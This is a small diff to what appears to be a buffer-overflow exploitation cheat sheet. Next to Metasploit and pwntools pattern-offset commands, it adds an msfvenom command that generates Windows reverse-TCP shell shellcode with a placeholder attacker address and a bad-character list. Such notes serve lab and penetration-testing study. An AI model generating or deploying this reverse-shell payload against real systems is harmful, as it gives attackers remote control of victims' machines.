@@ -32,3 +32,10 @@ Pattern offset commands
 /usr/share/metasploit-framework/tools/pattern_offset.rb -q 35724134
 pwn cyclic -l <offset>
 ```
+
+Shellcode
+
+```sh
+msfvenom -p windows/shell_reverse_tcp LHOST=XX.XX.XX.XX LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e" -f c -a x86 --platform windows -v shellcode
+```
+
